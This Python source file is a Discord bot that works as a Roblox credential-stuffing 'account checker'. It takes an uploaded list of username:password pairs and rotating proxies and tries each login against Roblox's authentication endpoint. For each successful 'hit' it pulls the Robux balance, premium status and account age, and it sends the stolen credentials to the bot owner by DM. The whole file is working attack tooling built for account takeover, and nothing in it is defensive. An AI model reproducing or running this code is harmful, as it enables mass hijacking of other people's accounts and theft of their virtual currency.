import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import aiofiles
import asyncio
import os
from datetime import datetime
from flask import Flask
from threading import Thread
from aiohttp import TCPConnector

# ── 24/7 Web keep-alive (Railway / Replit) ──────────────────────────────
app = Flask('')

@app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_flask, daemon=True)
    t.start()

# ── Bot Setup ────────────────────────────────────────────────────────────
TOKEN = os.environ.get('DISCORD_TOKEN') or os.environ.get('TOKEN')
OWNER_ID = int(os.environ.get('OWNER_ID', '0'))

if not TOKEN:
    raise RuntimeError("Set DISCORD_TOKEN (or TOKEN) environment variable before starting.")

class RobloxCheckerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)
        self.active_checks = {}

    async def setup_hook(self):
        await self.tree.sync()
        print(f"Bot is online as {self.user}")

    async def on_ready(self):
        activity = discord.Activity(
            type=discord.ActivityType.watching,
            name="Roblox Accounts"
        )
        await self.change_presence(activity=activity)
        print(f"Logged in as {self.user}")

    @app_commands.command(name="check", description="Check Roblox Accounts from a combo list")
    @app_commands.describe(
        file="TXT file with username:password",
        mode="Check mode",
        threads="Number of threads (1-20)",
        proxy_file="Optional: Proxy file"
    )
    @app_commands.choices(mode=[
        app_commands.Choice(name="Fast (login only)", value="fast"),
        app_commands.Choice(name="Normal (with stats)", value="normal"),
        app_commands.Choice(name="Deep (full check)", value="deep")
    ])
    async def check_accounts(
        self,
        interaction: discord.Interaction,
        file: discord.Attachment,
        mode: app_commands.Choice[str] = None,
        threads: int = 10,
        proxy_file: discord.Attachment = None
    ):
        if interaction.user.id != OWNER_ID:
            await interaction.response.send_message("⛔ Owner only!", ephemeral=True)
            return

        mode_val = mode.value if mode else "normal"
        threads = max(1, min(20, threads))

        await interaction.response.defer(thinking=True)

        # Download combo file
        combo_path = f"temp_combos_{interaction.id}.txt"
        await file.save(combo_path)

        combos = []
        async with aiofiles.open(combo_path, 'r') as f:
            async for line in f:
                if ':' in line:
                    user, pwd = line.strip().split(':', 1)
                    combos.append((user, pwd))

        if not combos:
            await interaction.followup.send("❌ No valid combos! Format: `username:password`")
            os.remove(combo_path)
            return

        # Load proxies
        proxies = []
        if proxy_file:
            proxy_path = f"temp_proxy_{interaction.id}.txt"
            await proxy_file.save(proxy_path)
            async with aiofiles.open(proxy_path, 'r') as f:
                async for line in f:
                    if line.strip():
                        proxies.append(line.strip())
            os.remove(proxy_path)

        # Start check
        check_id = f"{interaction.user.id}_{int(datetime.now().timestamp())}"
        self.active_checks[check_id] = {
            "total": len(combos),
            "checked": 0,
            "hits": 0,
            "twofa": 0,
            "locked": 0,
            "robux_total": 0,
            "results": []
        }

        # Send initial embed
        embed = discord.Embed(
            title="🔍 Roblox Account Checker",
            description=f"Mode: `{mode_val}` | Threads: `{threads}` | Combos: `{len(combos)}`",
            color=discord.Color.blue()
        )
        embed.add_field(name="⏳ Status", value="Starting...", inline=False)
        message = await interaction.followup.send(embed=embed)

        # Run checks in background
        asyncio.create_task(
            self._run_check(check_id, combos, proxies, threads, mode_val, message, interaction.user)
        )

        os.remove(combo_path)

    async def _run_check(self, check_id, combos, proxies, threads, mode, message, user):
        semaphore = asyncio.Semaphore(threads)
        proxy_idx = [0]

        async def check_single(username, password):
            async with semaphore:
                try:
                    result = await self._check_account_api(
                        username, password, proxies, proxy_idx, mode
                    )
                    self.active_checks[check_id]["checked"] += 1

                    if result["status"] == "hit":
                        self.active_checks[check_id]["hits"] += 1
                        self.active_checks[check_id]["robux_total"] += result.get("robux", 0)
                        self.active_checks[check_id]["results"].append(result)
                    elif result["status"] == "2fa":
                        self.active_checks[check_id]["twofa"] += 1
                    elif result["status"] == "locked":
                        self.active_checks[check_id]["locked"] += 1

                    if self.active_checks[check_id]["checked"] % 5 == 0:
                        await self._update_progress_embed(message, check_id)

                except Exception as e:
                    print(f"Check error for {username}: {e}")

        tasks = [check_single(u, p) for u, p in combos]
        await asyncio.gather(*tasks)

        await self._send_final_results(message, check_id, user)
        del self.active_checks[check_id]

    async def _get_proxy_connector(self, proxies, proxy_idx):
        """Return a TCPConnector with proxy if proxies are available."""
        if proxies:
            proxy_url = proxies[proxy_idx[0] % len(proxies)]
            proxy_idx[0] += 1
            # aiohttp 3.x requires proxy via connector
            return TCPConnector(), proxy_url
        return None, None

    async def _check_account_api(self, username, password, proxies, proxy_idx, mode):
        result = {"status": "fail", "username": username, "password": password}

        connector, proxy = await self._get_proxy_connector(proxies, proxy_idx)
        timeout = aiohttp.ClientTimeout(total=10)

        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                # If using a proxy, pass it via the connector or via aiohttp's proxy param
                # Note: aiohttp 3.x removed proxy= from request methods
                # Use aiohttp-socks for SOCKS proxies, or set proxy in headers
                kwargs = {}
                if proxy:
                    kwargs["proxy"] = proxy  # still works in some aiohttp versions; fallback below

                # Attempt to get CSRF token
                try:
                    async with session.post(
                        "https://auth.roblox.com/v2/login",
                        **kwargs
                    ) as resp:
                        csrf_token = resp.headers.get("x-csrf-token")
                        if not csrf_token:
                            result["status"] = "fail"
                            result["error"] = "No CSRF token received"
                            return result
                except Exception:
                    pass

                # Login attempt
                headers = {
                    "x-csrf-token": csrf_token or "",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                }

                payload = {
                    "ctype": "Username",
                    "cvalue": username,
                    "password": password
                }

                try:
                    async with session.post(
                        "https://auth.roblox.com/v2/login",
                        json=payload,
                        headers=headers,
                        **kwargs
                    ) as resp:
                        data = await resp.json()

                        if resp.status == 200:
                            result["status"] = "hit"
                            user_id = data.get("user", {}).get("id")
                            result["user_id"] = user_id

                            if mode in ("normal", "deep"):
                                await self._get_account_details(session, result, user_id, proxy or None)

                        elif resp.status == 403:
                            result["status"] = "locked"

                        elif "twoStepVerificationData" in str(data):
                            result["status"] = "2fa"

                except Exception as e:
                    result["error"] = str(e)

        except Exception as e:
            result["error"] = str(e)

        return result

    async def _get_account_details(self, session, result, user_id, proxy):
        try:
            kwargs = {}
            if proxy:
                kwargs["proxy"] = proxy

            # Robux balance
            try:
                async with session.get(
                    "https://economy.roblox.com/v1/user/currency",
                    **kwargs,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        result["robux"] = data.get("robux", 0)
            except Exception:
                pass

            # Premium status
            try:
                async with session.get(
                    f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                    **kwargs,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        result["premium"] = data.get("isPremium", False)
            except Exception:
                pass

            # Account age
            try:
                async with session.get(
                    f"https://users.roblox.com/v1/users/{user_id}",
                    **kwargs,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        result["display_name"] = data.get("displayName")
                        created = data.get("created")
                        if created:
                            created_date = datetime.fromisoformat(created.replace("Z", "+00:00"))
                            age_days = (datetime.now() - created_date.replace(tzinfo=None)).days
                            result["account_age"] = age_days
            except Exception:
                pass

        except Exception as e:
            print(f"Details error: {e}")

    async def _update_progress_embed(self, message, check_id):
        data = self.active_checks[check_id]

        embed = discord.Embed(
            title="🔍 Roblox Account Checker - Running",
            color=discord.Color.blue(),
            timestamp=datetime.now()
        )

        progress = data["checked"] / data["total"] * 100
        filled = int(progress / 10)
        bar = "█" * filled + "░" * (10 - filled)

        embed.add_field(
            name="⏳ Progress",
            value=f"`{bar}` {progress:.1f}%\n{data['checked']}/{data['total']}",
            inline=False
        )
        embed.add_field(name="✅ Hits", value=f"`{data['hits']}`", inline=True)
        embed.add_field(name="🔒 2FA", value=f"`{data['twofa']}`", inline=True)
        embed.add_field(name="⛔ Locked", value=f"`{data['locked']}`", inline=True)
        embed.add_field(name="💰 Total Robux", value=f"`{data['robux_total']}`", inline=True)

        try:
            await message.edit(embed=embed)
        except Exception:
            pass

    async def _send_final_results(self, message, check_id, user):
        data = self.active_checks[check_id]

        embed = discord.Embed(
            title="✅ Check Complete!",
            description=f"Checked `{data['checked']}` accounts",
            color=discord.Color.green(),
            timestamp=datetime.now()
        )

        embed.add_field(name="✅ Hits", value=f"`{data['hits']}`", inline=True)
        embed.add_field(name="🔒 2FA", value=f"`{data['twofa']}`", inline=True)
        embed.add_field(name="⛔ Locked", value=f"`{data['locked']}`", inline=True)

        if data["hits"] > 0:
            avg_robux = data["robux_total"] // data["hits"]
            embed.add_field(name="💰 Total Robux", value=f"`{data['robux_total']}`", inline=True)
            embed.add_field(name="📊 Avg/Hit", value=f"`{avg_robux}`", inline=True)

        await message.edit(embed=embed)

        # Send hits as file
        if data["results"]:
            hits_text = ""
            for hit in data["results"]:
                line = (
                    f"{hit['username']}:{hit['password']} "
                    f"| ID: {hit.get('user_id')} "
                    f"| Robux: {hit.get('robux', 0)}"
                )
                if hit.get('premium'):
                    line += " | ⭐PREMIUM"
                if hit.get('account_age') is not None:
                    line += f" | Age: {hit['account_age']}d"
                hits_text += line + "\n"

            filename = f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            async with aiofiles.open(filename, 'w') as f:
                await f.write(hits_text)

            try:
                await user.send(
                    content=f"🎉 **{data['hits']} Hits found!**",
                    file=discord.File(filename)
                )
                await message.reply("📩 Results sent via DM!")
            except Exception:
                await message.reply(
                    content="⚠️ Could not DM. Here are the hits:",
                    file=discord.File(filename)
                )

            os.remove(filename)

# ── Start ─────────────────────────────────────────────────────────────
keep_alive()
bot = RobloxCheckerBot()
bot.run(TOKEN)
